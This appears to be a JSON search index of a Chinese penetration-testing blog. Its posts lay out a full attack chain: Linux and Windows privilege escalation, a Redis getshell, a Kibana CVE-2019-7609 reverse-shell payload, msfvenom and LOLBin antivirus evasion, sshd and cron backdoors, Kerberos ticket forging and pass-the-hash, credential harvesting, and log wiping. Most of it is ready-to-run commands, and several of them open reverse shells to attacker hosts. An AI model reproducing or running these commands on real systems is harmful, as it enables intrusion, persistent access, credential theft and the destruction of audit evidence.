{"pages":[],"posts":[{"title":"权限提升-Linux常见提权方法、工具","text":"一、ed编辑器提权关键步骤：使用sudo运行ed编辑器(一般情况下使用sudo要输入当前用户密码) 12345test:~$ sudo ed!/bin/bashroot:~# iduid=0(root) gid=0(root) groups=0(root) 二、sudo 注入工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-sudo%E6%B3%A8%E5%85%A5.rar 1、exploit.sh 1234test:~$ sh exploit.shtest:~$ sudo -iroot:~# iduid=0(root) gid=0(root) groups=0(root) 2、exploit_v2.sh 1234test:~$ sh exploit_v2.shtest:~$ /tmp/sh -proot:~# iduid=0(root) gid=0(root) groups=0(root) 3、exploit_v3.sh 123test:~$ sh exploit_v3.shroot:~# iduid=0(root) gid=0(root) groups=0(root) 三、sudo ld.so自己判断系统下的ld.so文件位置和版本，一般情况在 /lib 文件下 123test:~$ sudo /lib/x86_64-linux-gnu/ld-2.29.so /usr/bin/python -c 'import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)'root:~# iduid=0(root) gid=0(root) groups=0(root)","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"},{"title":"权限提升-Window常见提权方法、工具","text":"一、metasploit利用方法1、service_permissions 模块在该模块下选择您的session ID 1msf5 exploit(windows/local/service_permissions) &gt; set sesions 2 选择”AGGRESSIVE”选项，可以利用目标机器每一个缺陷服务进行提权 1msf5 exploit(windows/local/service_permissions) &gt; set AGGRESSIVE true 2、always_install_elevated 模块该方法只要禁止注册表键 AlwaysInstallElevated。就可以阻止攻击者通过MSI文件进行提权。 3、trusted_service_path 模块此提权很容易被中断，需要不断的通信 需要在进程结束之前将它迁移到其他进程中，可以使用“set AytoRunScript migrate -f”命令自动迁移 4、enum_unattend 模块 5、令牌窃取使用msf5 &gt; sessions -i 1命令，把获取的session会话变成meterpreter会话 123meterpreter&gt; use incognitometerpreter&gt; list_tokens -umeterpreter&gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 6、添加域用户1234567meterpreter&gt;use incognitometerpreter&gt;add_user test password -h 192.168.128.139//在域控上添加账户meterpreter&gt;add_group_user &quot;Domain Admins&quot; test -h 192.168.128.139//将该账户加到域管理组 二、Psexec.exe incognito.exe Tokenvator.exe工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12345678Psexec:C:\\temp&gt; psexec -s -i cmd.exeincognito:C:\\temp&gt; incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exeTokenvator:C:\\temp&gt; Tokenvator.exe getsystem cmd.exe 三、ctftool 提权工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12c:\\&gt;ctftoolctf&gt; script .\\scripts\\ctf-consent-system.ctf 四、Bypass-UAC.ps1工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Window%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"},{"title":"命令执行-Empire建立监听器获取会话","text":"Empire建立监听器123456empire&gt;listeners # 查看已创建监听器empire&gt;uselistener httpempire&gt;set Name 123 # 设置创建器名字empire&gt;set Port 8081empire&gt;set Host 192.168.128.137empire&gt;execute 生成反弹载荷选择powershell类型的载荷，选择创建器名字 1launcher powershell 123 被测试机器执行该载荷被测试机器执行该载荷，Empire接受会话 进入会话使用agents查看获取的会话使用interact进入该会话 1Empire &gt; interact D3WVPFMR","link":"/2020/04/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Empire%E5%BB%BA%E7%AB%8B%E7%9B%91%E5%90%AC%E5%99%A8%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9D/"},{"title":"渗透测试-Redis未授权访问 getshell","text":"RedisRedis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上，并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥进行远程连接等。 本地漏洞环境搭建靶机：CentOS6.5 CentOS安装redis： 1234wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd redis-3.2.0make 修改配置文件，使可以远程访问： 123vim redis.confbind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server./src/redis-server redis-conf 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。 Redis常见getshell方法1.反弹shell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.128.136/2334 0&gt;&amp;1\\n&quot;OK192.168.128.145:6379&gt; config set dir /var/spool/cron/OK192.168.128.145:6379&gt; config set dbfilename rootOK192.168.128.145:6379&gt; saveOK 12192.168.128.136主机：root@192.168.128.136:~# nc -lvvp 2334 2.写入webshell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /var/www/html/OK192.168.128.145:6379&gt; config set dbfilename shell.phpOK192.168.128.145:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;OK192.168.128.145:6379&gt; saveOK webshell访问http://192.168.128.145/shell.php 3.写入SSH密钥生成SSH密钥 1root@kali:~/.ssh# ssh-keygen -t rsa 复制生成的id_rsa.pub文件内容写入redis，注意密钥一定要在前后各加入”\\n\\n\\n”写入 123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /root/.ssh/OK192.168.128.145:6379&gt; config set dbfilename authorized_keysOK192.168.128.145:6379&gt; set x &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n&quot;OK192.168.128.145:6379&gt; saveOK 12root@kali:~# ssh -i id_rsa root@192.168.128.145root@192.168.128.145:~# 安全修复1、限制登录ip2、添加密码","link":"/2020/04/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-getshell/"},{"title":"渗透测试-Kibana CVE-2019-7609 RCE","text":"影响版本kibana &lt; 6.6.0 payloadpayload 1: 1.es(*).props(label.proto.env.AAAA='require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//') .props(label.proto.env.NODE_OPTIONS='--require /proc/self/environ') payload 2: 1.es(*).props(label.proto.env.AAAA='require(&quot;child_process&quot;).exec(&quot;bash -c \\'bash -i&gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1\\'&quot;);//') 触发位置","link":"/2020/04/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Kibana-CVE-2019-7609-RCE/"},{"title":"绕过防御-window免杀(上)","text":"使用msfvenom生成载荷参考链接：https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/ 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe 利用handler模块监听会话12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf5 &gt; set LHOST 192.168.128.137msf5 &gt; set LPORT 4444msf5 &gt; exploit 在目标机器免杀执行1、Msiexec.exe (window自带)远程加载shellcode 1msiexec.exe /q /i http://*.*.*.*/shellcode.txt 2、mshta.exe (window自带)1mshta.exe http://xxx.com/shellcode.hta 3、wmic.exe (window自带)1wmic os get /FORMAT:&quot;http://example.com/evil.xsl&quot; 4、ATBroker.exe (window自带)1ATBroker.exe /start shellcode","link":"/2020/04/05/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1-window%E5%85%8D%E6%9D%80-%E4%B8%8A/"},{"title":"绕过防御-window免杀(下)","text":"使用msfvenom生成载荷参考链接：https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/ 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe 利用handler模块监听会话12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf5 &gt; set LHOST 192.168.128.137msf5 &gt; set LPORT 4444msf5 &gt; exploit 在目标机器免杀执行5、bash.exe (window自带)1bash.exe -c shellcode.exe 6、cmstp.exe (window自带)123cmstp.exe /ni /s c:\\cmstp\\CorpVPN.infcmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf 7、forfiles.exe (window自带)123forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exeforfiles /p c:\\windows\\system32 /m notepad.exe /c &quot;C:\\Users\\shell.exe&quot;","link":"/2020/04/05/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1-window%E5%85%8D%E6%9D%80-%E4%B8%8B/"},{"title":"权限持久-Linux常见持久化方法","text":"一、SSH衍生被测试机执行： 1234567[root@localhost ~]# cd /usr/sbin[root@localhost sbin]# mv sshd ../bin[root@localhost sbin]# echo '#!/usr/bin/perl' &gt;sshd[root@localhost sbin]# echo 'exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd[root@localhost sbin]# echo 'exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,' &gt;&gt;sshd[root@localhost sbin]# chmod u+x sshd[root@localhost sbin]# /etc/init.d/sshd restart 测试机执行： 1socat STDIO TCP4:10.18.180.20:22,sourceport=13377 二、linux计划任务先创建 /etc/backdoor.sh 脚本文件（名字自己改），利用该脚本进行反弹。以下脚本代表全自动反弹到 8.8.8.8 的 53 端口 脚本： 123456789#!/bin/bashif netstat -ano|grep -v grep | grep &quot;8.8.8.8&quot;&gt;/dev/nullthenecho &quot;OK&quot;&gt;/dev/nullelse/sbin/iptables --policy INPUT ACCEPT/sbin/iptables --policy OUTPUT ACCEPTbash -i &gt;&amp; /dev/tcp/8.8.8.8/53 0&gt;&amp;1fi chmod +755 /etc/backdoor.sh 然后我们需要修改一下 /etc/crontab 让它定时执行, nano /etc/crontab 在 /etc/crontab 文件末加入这一行,代表每 1 分钟执行一次。 最后重启一下 crond 的服务。（不同发行版重启方式不一样，自行查询） 12service cron reloadservice cron start 之后在meterpeter接受反弹的会话","link":"/2020/04/05/%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85-Linux%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95/"},{"title":"权限持久-window常见持久化方法","text":"一、Empire1、注册表后门1234567empire &gt; usemodule persistence/userland/registryempire &gt; set Listener 名字empire &gt; set RegPath HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Runempire &gt; execute 2、计划任务后门1234567empire &gt; usemodule persistence/elevated/schtasksempire &gt; set DailyTime 14:00empire &gt; set Listener 123empire &gt; execute 3、粘贴键后门123456789empire &gt; hostname #获取主机名empire &gt; usemodule lateral_movement/invoke_wmi_debuggerempire &gt; set Listener 123empire &gt; set ComputerName stu1.god.orgempire &gt; execute 4、WMI后门123empire &gt; persistence/elevated/wmiempire &gt; run 5、C#加载执行mimikatz之dll劫持1234567C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:tasks.dll tasks.csset APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=nullset APPDOMAIN_MANAGER_TYPE=MyAppDomainManagerset COMPLUS_Version=v4.0.30319copy tasks.dll C:\\Windows\\System32\\Tasks\\tasks.dllcopy tasks.dll C:\\Windows\\SysWow64\\Tasks\\tasks.dllFileHistory /?","link":"/2020/04/05/%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85-window%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95/"},{"title":"横向渗透-域渗透 PTT、PTH、PTK","text":"一、PTT1、ms14-068工具：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 已经拿到了一台域普通权限 使用方法： 12ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45 再使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器 123mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中 考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：https://github.com/gentilkiwi/kekeo/releases 例如 12kekeo# tgt::ask /user:testuser /domain:hacke.testlab /ntlm:518b98ad4178a53695dc997aa02d455ckekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot; 执行后生成票据 :TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi 接下来导入票据：kekeo &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; 2、Golden ticket伪造黄金凭据需要具备下面条件: (1).krbtgt用户的hash(就意味着你已经有域控制器权限了) (2).域名称 (3).域的SID值 (4).要伪造的用户名 12privilege::debuglsadump::lsa /patch 切换到普通域用户的机器，生成TGT凭证,用户名为administrator: 然后使用mimikatz将凭证注入进去,攻击成功: mimikatz # kerberos::ptt test.kirbi 3、Silver ticker(1).首先登录域控，dump机器hash 12privilege::debugsekurlsa::logonpasswords (2).将hash保存下来，在普通域用户机器中进行ptt 1kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:192.168.3.21 /rc4:8432d4fa4430ecf56927dbabd1b4d36b /service:cifs /user:mary /ptt 这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统: 二、PTH1、mimikatzmimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息 安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash 12privilege::debugsekurlsa::logonpasswords 得到hash后: sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7 2、wmiexec(1).Invoke-WMIExec 工具：https://github.com/wsfengfan/Invoke-TheHash 12Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose 查看192.168.3.21机器，发现calc.exe进程已经启动: 另外还有Invoke-SMB等脚本都可以进行利用，利用方法也差不多一样： 1Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose (2).wmiexec wmiexec.py 脚本地址：https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py wmiexec.exe 通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便 ：https://github.com/maaaaz/impacket-examples-windows wmiexec.py的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可 参数实例(wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值)： 1wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 &quot;whoami&quot; 三、PTK1、mimikatz还是使用的mimikatz工具，不过需免杀。 获取用户的aes key:mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 注入aes key: 1mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288&quot; 成功注入aes256，尝试远程连接：","link":"/2020/04/05/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F-PTT%E3%80%81PTH%E3%80%81PTK/"},{"title":"窃取凭证-window、Linux常见方法","text":"一、window1、组策略首选项(GPP)文件12345https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/maste r/Exfiltration/Get-GPPPassword.ps1 PS&gt; Import-Moudle .\\Get- GPPassword.ps1 PS&gt; Get-GPPaswword 2、文件和注册表的凭据查询注册表里的凭据: 123获取所有用户：reg query HKLM /f password /t REG_SZ /s 获取当前用户：reg query HKCU /f password /t REG_SZ /s 查找文件里的凭据: 12345findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini 二、Linux1、mimipenguin(基于mimikatz)12345git clone https://github.com/huntergregal/mimipenguin.git cd mimipenguin/ ./mimipenguin # 运行 mimipenguin 获取凭证 2、cat ~/.bash_history1sudo cat ~/.bash_history | grep password &gt; bash.txt 3、grep文本搜索工具1234567grep -riP '{你要查找的字符串}' '{文件路径}'grep -riP password /etc/# -P 表示用 perl 正则表达式 # -r 递归查询 # -i 不区分大小写 4、攻击留痕(获取攻击携带的敏感数据，或者为攻击清理)12345678message日志cat /var/log/messagesaudit日志cat /var/log/audit/audit.logbash历史记录cat ~/.bash_history","link":"/2020/04/05/%E7%AA%83%E5%8F%96%E5%87%AD%E8%AF%81-window%E3%80%81Linux%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95/"},{"title":"痕迹清理-window、Linux常见除痕方法","text":"一、window1、window日志清除(1)、meterpreter: 1meterpreter &gt; clearev (2)、CMD: 获取日志分类列表：wevtutil el &gt;1.txt 获取单个日志类别的统计信息： eg.wevtutil gli &quot;windows powershell&quot; 回显： 1234567creationTime: 2016-11-28T06:01:37.986ZlastAccessTime: 2016-11-28T06:01:37.986ZlastWriteTime: 2017-08-08T08:01:20.979ZfileSize: 1118208attributes: 32numberOfLogRecords: 1228oldestRecordNumber: 1 查看指定日志的具体内容：wevtutil qe /f:text &quot;windows powershell&quot; 删除单个日志类别的所有信息：wevtutil cl &quot;windows powershell&quot; 2、破坏window日志功能工具：Invoke-Phant0m 3、3389登入记录清除1234@echo off@reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /f@del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; /a@exit 二、Linux1、清除命令(1)仅清理当前用户：history -c (2)使系统不再保存命令记录：vi /etc/profile 找到HISTSIZE这个值，修改为0 (3)删除记录：删除登录失败记录：echo &gt; /var/log/btmp删除登录成功记录：echo &gt; /var/log/wtmp （此时执行last命令就会发现没有记录）删除日志记录：echo &gt; /var/log/secure 2、攻击防护(1)、不记录到history： 执行命令时 以空格开头，则不会记录到 history 12root#:export HISTCONTROL=ignorespaceroot#:(空格)命令 禁用当前会话的所有历史记录： 12root#:export HISTSIZE=0root#:history -cw 清除全部历史记录 123root#: rm ~/.bash_history root#: echo &quot; &quot; &gt; .bash_history root#: cat /dev/null &gt; ~/.bash_history (2)、audit日志 清除 audit 日志 1cat /dev/null &gt; /var/log/audit/audit.log #清除日志文件","link":"/2020/04/05/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86-window%E3%80%81Linux%E5%B8%B8%E8%A7%81%E9%99%A4%E7%97%95%E6%96%B9%E6%B3%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"权限提升","slug":"权限提升","link":"/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"命令执行","slug":"命令执行","link":"/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"绕过防御","slug":"绕过防御","link":"/tags/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1/"},{"name":"权限持久","slug":"权限持久","link":"/tags/%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85/"},{"name":"窃取凭证","slug":"窃取凭证","link":"/tags/%E7%AA%83%E5%8F%96%E5%87%AD%E8%AF%81/"},{"name":"痕迹清理","slug":"痕迹清理","link":"/tags/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"},{"name":"横向渗透","slug":"横向渗透","link":"/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"}],"categories":[]}